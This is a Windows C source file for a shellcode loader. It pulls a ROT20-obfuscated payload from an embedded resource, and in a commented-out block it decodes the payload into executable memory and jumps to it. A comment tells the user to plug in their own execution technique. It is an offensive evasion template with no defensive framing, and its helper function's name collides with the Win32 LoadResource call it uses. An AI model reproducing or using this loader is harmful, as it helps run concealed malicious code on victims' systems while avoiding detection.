
#include <windows.h>
#include <stdio.h>
#include <string.h>


void LoadResource(const char* resName, char** data, DWORD* size) {
    HMODULE hModule = GetModuleHandle(NULL);
    HRSRC hResource = FindResource(hModule, resName, RT_RCDATA);
    if (hResource == NULL) {
        printf("Resource not found!\n");
        exit(1);
    }

    HGLOBAL hResData = LoadResource(hModule, hResource);
    *size = SizeofResource(hModule, hResource);
    *data = (char*)LockResource(hResData);
}

void rot20(char* code, DWORD opsize){
     for (DWORD i = 0; i < opsize; i++) {
         code[i] = (code[i] - 20) % 256;
     }
}

int main() {
    char* rot20code;
    DWORD rot20size;

    // Load the encrypted shellcode resource
    LoadResource("ROT20", &rot20code, &rot20size);

  /* Please use your own logic/technique or method to get code exec
    // Allocate memory for the decrypted shellcode
    LPVOID address = VirtualAlloc(NULL, rot20size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (address == NULL) {
        printf("Memory allocation failed!\n");
        return 1;
    }

    // Decrypt the shellcode using ROT20
    rot20(rot20code, rot20size);

    // Print the decrypted shellcode
    printf("Decrypted shellcode:\n");
    for (DWORD i = 0; i < rot20size; i++) {
        printf("\\x%02x", (unsigned char)rot20code[i]);
    }
    printf("\n");

    // Copy the decrypted shellcode to the allocated memory
    memcpy(address, rot20code, rot20size);

    // Execute the shellcode
    ((void(*)())address)();
   */
    return 0;
}
